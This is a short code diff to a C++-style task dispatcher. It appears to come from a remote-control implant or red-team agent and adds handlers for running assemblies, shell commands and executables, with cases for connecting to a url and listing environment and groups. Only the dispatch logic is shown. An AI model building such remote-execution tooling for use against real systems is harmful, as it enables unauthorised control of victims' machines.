@@ -172,11 +172,17 @@ namespace Handler
 
         switch(commandCode)
         {
+            case TASK_ASSEMBLY:
+                wTaskResult = Task::Assembly(pState, Utils::Convert::UTF8Decode(args["assembly"]));
+                break;
             case TASK_CAT:
                 wTaskResult = Task::Cat(pState, Utils::Convert::UTF8Decode(args["path"]));
                 break;
             case TASK_CD:
                 wTaskResult = Task::Cd(pState, Utils::Convert::UTF8Decode(args["path"]));
+                break;
+            case TASK_CMD:
+                wTaskResult = Task::Cmd(pState, Utils::Convert::UTF8Decode(args["cmd"]));
                 break;
             case TASK_CONNECT:
                 wTaskResult = Task::Connect(pState, Utils::Convert::UTF8Decode(args["url"]));
@@ -208,8 +214,8 @@ namespace Handler
             case TASK_ENV_LS:
                 wTaskResult = Task::EnvLs(pState);
                 break;
-            case TASK_EXECUTE:
-                wTaskResult = Task::Execute(pState, Utils::Convert::UTF8Decode(args["cmd"]));
+            case TASK_EXE:
+                wTaskResult = Task::Exe(pState, Utils::Convert::UTF8Decode(args["exe"]));
                 break;
             case TASK_GROUP_LS:
                 wTaskResult = Task::GroupLs();
